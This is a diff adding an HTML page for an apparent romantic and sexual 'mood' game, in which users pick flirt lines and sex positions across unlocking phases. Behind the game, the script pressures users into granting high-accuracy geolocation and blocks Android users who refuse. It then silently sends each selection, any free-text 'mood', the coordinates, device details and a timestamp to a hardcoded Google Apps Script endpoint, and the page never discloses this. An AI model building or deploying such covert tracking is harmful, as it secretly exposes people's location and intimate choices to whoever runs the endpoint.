@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Journey of Desire</title>
+  <style>
+    :root {
+      --accent: #ff4d6d;
+      --glass: rgba(0, 0, 0, 0.9);
+      --panel-bg: rgba(0, 0, 0, 0.85);
+    }
+
+    * {
+      -webkit-tap-highlight-color: transparent;
+      box-sizing: border-box;
+    }
+
+    body,
+    html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: transparent;
+      color: white;
+      font-family: 'Inter', sans-serif;
+      overflow: hidden;
+    }
+
+
+    /* The Background Layer */
+    #bg-layer {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-size: cover;
+      background-position: center;
+      transition: background-image 1.2s ease-in-out, filter 1s, opacity 0.5s;
+      z-index: 0;
+      filter: brightness(0.9);
+      background-image: url('images/phase1.png');
+      background-color: #000;
+    }
+
+
+    .overlay {
+      position: relative;
+      z-index: 1;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      padding: 20px;
+      background: linear-gradient(0deg, rgba(0, 0, 0, 0.8) 0%, transparent 60%);
+    }
+
+
+
+    /* Status Guide */
+    #status-guide {
+      text-align: center;
+      font-size: 0.65rem;
+      color: var(--accent);
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      margin-bottom: 10px;
+      font-weight: 900;
+      animation: glow 2s infinite;
+    }
+
+    @keyframes glow {
+
+      0%,
+      100% {
+        opacity: 0.5;
+      }
+
+      50% {
+        opacity: 1;
+        text-shadow: 0 0 10px var(--accent);
+      }
+    }
+
+    .stage-area {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 20px;
+    }
+
+    #mood-text {
+      font-size: 1.3rem;
+      font-style: italic;
+      color: #ffccd5;
+      transition: opacity 0.4s;
+      min-height: 80px;
+      text-shadow: 0 2px 20px #000;
+      line-height: 1.4;
+    }
+
+    .panel {
+      background: var(--panel-bg);
+      border-radius: 35px;
+      padding: 25px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      margin-bottom: env(safe-area-inset-bottom);
+    }
+
+    /* Progress Bar */
+    .progress-bar {
+      height: 3px;
+      background: rgba(255, 255, 255, 0.1);
+      margin-bottom: 20px;
+      border-radius: 2px;
+      overflow: hidden;
+    }
+
+    #heat-progress {
+      width: 5%;
+      height: 100%;
+      background: var(--accent);
+      transition: width 0.5s;
+      box-shadow: 0 0 10px var(--accent);
+    }
+
+    .mood-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+
+    .action-btn {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      color: #fff;
+      padding: 18px 5px;
+      border-radius: 18px;
+      font-size: 0.7rem;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      display: none;
+      transition: 0.3s;
+      cursor: pointer;
+    }
+
+    .action-btn.active {
+      display: block;
+      animation: fadeInUp 0.5s ease;
+    }
+
+    .action-btn:active {
+      background: var(--accent);
+      transform: scale(0.95);
+    }
+
+    /* Selector Modal */
+    #selector-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.95);
+      z-index: 100;
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      padding: 30px;
+      animation: fadeIn 0.4s;
+    }
+
+    .modal-title {
+      font-size: 1rem;
+      color: var(--accent);
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      margin-bottom: 25px;
+      text-align: center;
+    }
+
+    .option-list {
+      display: block;
+      overflow-y: auto;
+      max-height: 55vh;
+      padding: 10px 5px 80px 5px;
+      -webkit-overflow-scrolling: touch;
+    }
+
+
+
+
+
+    .option-list::-webkit-scrollbar {
+      width: 4px;
+    }
+
+    .option-list::-webkit-scrollbar-thumb {
+      background: var(--accent);
+      border-radius: 10px;
+    }
+
+
+    .option-btn {
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 15px;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      transition: 0.2s;
+      cursor: pointer;
+      width: 100%;
+      margin-bottom: 12px;
+      min-height: 240px;
+      /* Force minimum size */
+    }
+
+    .option-img {
+      width: 100%;
+      height: 180px !important;
+      min-height: 180px !important;
+      flex-shrink: 0;
+      object-fit: contain;
+      background: #000;
+      display: block;
+    }
+
+    .option-content {
+      padding: 15px;
+      font-size: 1rem;
+      font-weight: 700;
+      text-align: center;
+      color: #ffffff !important;
+      background: rgba(255, 255, 255, 0.05);
+      flex-grow: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+
+
+
+    .option-btn:active {
+      background: var(--accent);
+      transform: scale(0.98);
+    }
+
+
+    .custom-input-wrap {
+      margin-top: 25px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    #custom-mood {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 15px;
+      padding: 15px;
+      color: #fff;
+      font-size: 0.9rem;
+      outline: none;
+    }
+
+    #custom-mood:focus {
+      border-color: var(--accent);
+    }
+
+    .submit-custom {
+      background: var(--accent);
+      color: #fff;
+      border: none;
+      padding: 15px;
+      border-radius: 15px;
+      font-weight: 800;
+      text-transform: uppercase;
+      cursor: pointer;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+
+      to {
+        opacity: 1;
+      }
+    }
+
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(10px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Blocking Overlay for Permission -->
+  <div id="permission-overlay"
+    style="position:fixed; top:0; left:0; width:100%; height:100%; background: url('images/bg4.png') center/cover; z-index:9999; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:30px; text-align:center;">
+    <div style="position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:-1;">
+    </div>
+    <div style="font-size:3rem; margin-bottom:10px;">✨</div>
+    <h1 style="margin-bottom:5px; color:#fff; font-family: 'Playfair Display', serif; font-size: 2.2rem;">🌸 H. 🌸</h1>
+    <p style="color:#ddd; font-size:1.1rem; margin-bottom:40px; font-style: italic;">Express via words
+    </p>
+
+    <button onclick="requestAccess()" class="action-btn active"
+      style="width: auto; padding: 15px 50px; font-size: 1.1rem; letter-spacing: 2px;">SHARE YOUR MOODS</button>
+
+    <div id="permission-status" style="color:#ff4d4d; font-size:0.8rem; margin-top:20px;"></div>
+  </div>
+
+
+
+  <div id="bg-layer"></div>
+
+  <div class="overlay">
+    <div class="stage-area">
+      <div id="mood-text">Touch an option to begin our night...</div>
+    </div>
+
+    <div class="panel">
+      <div id="status-guide">Phase 1: The Spark</div>
+      <div class="progress-bar">
+        <div id="heat-progress"></div>
+      </div>
+
+      <div class="mood-grid">
+        <button id="b1" class="action-btn active" onclick="openSelector('flirt')">Flirt</button>
+        <button id="b2" class="action-btn active" onclick="openSelector('whisper')">Whisper</button>
+        <button id="b3" class="action-btn" onclick="openSelector('kiss')">Deep Kiss</button>
+        <button id="b4" class="action-btn" onclick="openSelector('neck')">Neck Kiss</button>
+        <button id="b5" class="action-btn" onclick="openSelector('bite')">Lip Bite</button>
+        <button id="b6" class="action-btn" onclick="openSelector('touch')">Roaming Hands</button>
+        <button id="b7" class="action-btn" onclick="openSelector('undress')">Undress</button>
+        <button id="b8" class="action-btn" onclick="openSelector('worship')">Worship</button>
+        <button id="b9" class="action-btn" onclick="openSelector('union')">Union</button>
+      </div>
+    </div>
+  </div>
+
+  <div id="selector-modal">
+    <div class="modal-title">How are you feeling?</div>
+    <div class="option-list" id="option-list">
+      <!-- Options injected here -->
+    </div>
+    <div class="custom-input-wrap">
+      <input type="text" id="custom-mood" placeholder="Or write your own mood...">
+      <button class="submit-custom" onclick="submitCustom()">Share Feeling</button>
+    </div>
+  </div>
+
+  <script>
+    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyxZrEUQwxdEEh0XeuiJ01lQxN-5GUiKNWXIsltafi4X_a64VY94xcA0U_8nrRT5_zF/exec";
+
+    let totalClicks = 0;
+    let currentType = '';
+    let userCoords = "Location Pending";
+
+    const moodData = {
+      flirt: {
+        img: "images/phase1.png",
+        options: ["I've been thinking about this all day.", "You have no idea how much I want you right now.", "Come closer... don't be shy."]
+      },
+      whisper: {
+        img: "images/whisper.png",
+        options: ["Leaning in to tell you exactly what I'm going to do.", "Your skin smells incredible.", "I want to feel you shiver against me."]
+      },
+      kiss: {
+        img: "images/phase2.png",
+        options: ["A slow, deep kiss that tastes like heaven.", "I could stay lost in your lips forever.", "More... I need more of you."]
+      },
+      neck: {
+        img: "images/neck.png",
+        options: ["Kissing the spot that makes you moan.", "I love the way your heart races under my lips.", "Marking you as mine... slowly."]
+      },
+      bite: {
+        img: "images/phase2.png",
+        options: ["I want to leave my mark on you.", "You taste so dangerous.", "Just a little nip to make you shiver."]
+      },
+      touch: {
+        img: "images/phase3.png",
+        options: ["My hands exploring every curve you've been hiding.", "I want to feel every inch of your warmth.", "You feel so good... so soft."]
+      },
+      undress: {
+        img: "images/undress.png",
+        options: ["Finally... nothing between our skin.", "I want to see you completely.", "Removing everything that stands between us."]
+      },
+      worship: {
+        img: "images/phase3.png",
+        options: ["I'm going to spend hours worshiping you.", "Let me see every beautiful part of you.", "I want to taste you until you scream."]
+      },
+      union: {
+        img: "images/union.png",
+        options: [
+          { text: "The Cowgirl", img: "images/men-shealth-thecowgirl-1581102015.avif" },
+          { text: "The Hot Seat", img: "images/men-shealth-hotseat-1581102043.avif" },
+          { text: "Reverse Cowgirl", img: "images/menshealth-reversecowgirl-v2-1581102136.avif" },
+          { text: "Spoon", img: "images/men-shealth-spoon-v2-1581103250.avif" },
+          { text: "Open-Legged Spoon", img: "images/open-legged-spoon-3-1650382204.avif" },
+          { text: "The G-Whiz", img: "images/menshealth-gwhiz-v2-1581102368.avif" },
+          { text: "The Lazy Man", img: "images/menshealth-lazyman-1581102217.avif" },
+          { text: "Mountain Climber", img: "images/menshealth-mountainclimber-1581103074.avif" },
+          { text: "Thighmaster", img: "images/menshealth-poleposition-1581102164.avif" },
+          { text: "Spin Cycle", img: "images/menshealth-spincycle-1581102077.avif" },
+          { text: "Stairway to Heaven", img: "images/menshealth-stairwaytoheaven-1581102102.avif" },
+          { text: "Yourself on the Shelf", img: "images/menshealth-yourselfonashelf-1581101522.avif" }
+        ]
+
+      }
+    };
+
+
+    function openSelector(type) {
+      currentType = type;
+      const modal = document.getElementById('selector-modal');
+      const list = document.getElementById('option-list');
+      const data = moodData[type];
+
+      list.innerHTML = '';
+      data.options.forEach(opt => {
+        const btn = document.createElement('div');
+        btn.className = 'option-btn';
+
+        const text = typeof opt === 'string' ? opt : opt.text;
+        const optImg = typeof opt === 'string' ? data.img : opt.img;
+
+        btn.innerHTML = `
+            <img src="${optImg}" class="option-img" loading="lazy">
+            <div class="option-content">${text}</div>
+        `;
+
+        btn.onclick = () => selectMood(text, optImg);
+        list.appendChild(btn);
+      });
+
+
+      document.getElementById('custom-mood').value = '';
+      modal.style.display = 'flex';
+    }
+
+    function submitCustom() {
+      const val = document.getElementById('custom-mood').value.trim();
+      if (val) selectMood(val);
+    }
+
+    function selectMood(text, customImg) {
+      totalClicks++;
+      const modal = document.getElementById('selector-modal');
+      const bg = document.getElementById('bg-layer');
+      const moodText = document.getElementById('mood-text');
+      const progress = document.getElementById('heat-progress');
+      const guide = document.getElementById('status-guide');
+
+      const data = moodData[currentType];
+      const finalImg = customImg || data.img;
+
+      // UI Updates
+      modal.style.display = 'none';
+      bg.style.backgroundImage = `url('${finalImg}')`;
+      bg.style.backgroundSize = 'cover';
+      bg.style.backgroundPosition = 'center';
+
+
+
+      moodText.style.opacity = 0;
+      setTimeout(() => {
+        moodText.innerText = `“${text}”`;
+        moodText.style.opacity = 1;
+      }, 300);
+
+      // Progress Logic
+      let heatVal = Math.min((totalClicks / 20) * 100, 100);
+      progress.style.width = heatVal + "%";
+
+      if (totalClicks >= 3 && totalClicks < 10) {
+        ['b3', 'b4', 'b5'].forEach(id => document.getElementById(id).classList.add('active'));
+        guide.innerText = "Phase 2: Heating Up";
+        bg.style.filter = "brightness(0.8) saturate(1.2)";
+      } else if (totalClicks >= 10) {
+        ['b6', 'b7', 'b8', 'b9'].forEach(id => document.getElementById(id).classList.add('active'));
+        guide.innerText = "Phase 3: Passionate Peaks";
+        bg.style.filter = "brightness(0.75) saturate(1.4)";
+        document.documentElement.style.setProperty('--accent', '#a4161a');
+      } else {
+        guide.innerText = `${3 - totalClicks} more clicks to unlock Phase 2`;
+      }
+
+
+      // Tracking
+      sendData(`${currentType}: ${text}`);
+    }
+
+    function sendData(action) {
+      postToSheet(action, userCoords);
+    }
+
+    function postToSheet(action, loc) {
+      fetch(GOOGLE_SCRIPT_URL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          number: action,
+          location: loc,
+          device: navigator.userAgent,
+          timestamp: new Date().toLocaleString()
+        })
+      }).catch(e => console.error(e));
+    }
+
+    function requestAccess() {
+      const status = document.getElementById('permission-status');
+      const overlay = document.getElementById('permission-overlay');
+      const isAndroid = /Android/i.test(navigator.userAgent);
+
+      status.innerText = "Requesting access...";
+
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            userCoords = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+            overlay.style.display = 'none';
+            sendData('journey_started');
+          },
+          (err) => {
+            if (isAndroid) {
+              status.innerText = "Not enough permission to proceed. Please enable location.";
+            } else {
+              overlay.style.display = 'none';
+              sendData('journey_started');
+            }
+          },
+          { timeout: 10000, enableHighAccuracy: true }
+        );
+      } else {
+        overlay.style.display = 'none';
+        sendData('journey_started');
+      }
+    }
+
+
+    window.onload = () => {
+      // Show welcome overlay for everyone by default
+      document.getElementById('permission-overlay').style.display = 'flex';
+    };
+
+
+
+  </script>
+</body>
+
+</html>
